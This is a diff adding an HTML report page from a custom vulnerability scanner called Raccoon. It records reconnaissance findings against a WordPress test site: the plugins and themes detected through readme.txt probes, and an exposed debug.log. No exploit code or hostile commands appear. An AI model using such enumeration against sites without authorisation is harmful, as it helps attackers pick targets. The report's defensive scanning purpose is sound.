+<span class="list-item">Description:</span>
+<span class="description">Detect plugins that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/plugins<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp-plugin: ad-inserter<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/marmoset-viewer/readme.txt">http://wordpress.raccoon-solution.online/wp-content/plugins/marmoset-viewer/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-plugins-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Plugins Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed themes to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect plugins that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/plugins<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp-plugin: marmoset-viewer<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/profile-builder/readme.txt">http://wordpress.raccoon-solution.online/wp-content/plugins/profile-builder/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-plugins-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Plugins Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed themes to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect plugins that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/plugins<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp-plugin: profile-builder<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/simple-file-list/readme.txt">http://wordpress.raccoon-solution.online/wp-content/plugins/simple-file-list/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-plugins-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Plugins Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed themes to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect plugins that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/plugins<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp-plugin: simple-file-list<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/simple-ajax-chat/readme.txt">http://wordpress.raccoon-solution.online/wp-content/plugins/simple-ajax-chat/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-plugins-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Plugins Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed themes to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect plugins that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/plugins<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp-plugin: simple-ajax-chat<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/themes/twentytwenty/readme.txt">http://wordpress.raccoon-solution.online/wp-content/themes/twentytwenty/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-themes-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Theme Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Danh, Hoa</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed plugins to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect themes that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/themes<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp_theme: twentytwenty<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/themes/twentytwentyone/readme.txt">http://wordpress.raccoon-solution.online/wp-content/themes/twentytwentyone/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-themes-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Theme Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Danh, Hoa</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed plugins to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect themes that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/themes<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp_theme: twentytwentyone<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/themes/twentytwentytwo/readme.txt">http://wordpress.raccoon-solution.online/wp-content/themes/twentytwentytwo/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-themes-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Theme Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Danh, Hoa</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed plugins to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect themes that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/themes<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp_theme: twentytwentytwo<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/debug.log">http://wordpress.raccoon-solution.online/wp-content/debug.log</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-debug-log</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress debug log</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Danh, Hoa</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Hide or forbidden people access to this log.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: green; font-weight: bold">low</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description"></span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference"></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol></div>
+</main>
+<footer class="text-center text-lg-start">
+<div class="text-center p-3" style="background-color: rgb(17,16,12,255); color: white;">
+                      2022 - Raccoon - Custom Vulnerability Scanner <br/>
+                      Racoon v1.1.0 <br/>
+                      Coded by Hung Tran, Dat Tran, Danh Dao, Hoa Le
+                </div>
+</footer>
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script crossorigin="anonymous" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<!--        <script src="../js/chartUtils.js"></script>-->
+<script src="https://raccoon-solution.online/RacconDocumentation/js/chartUtils.js"></script>
+</body>
+</html>
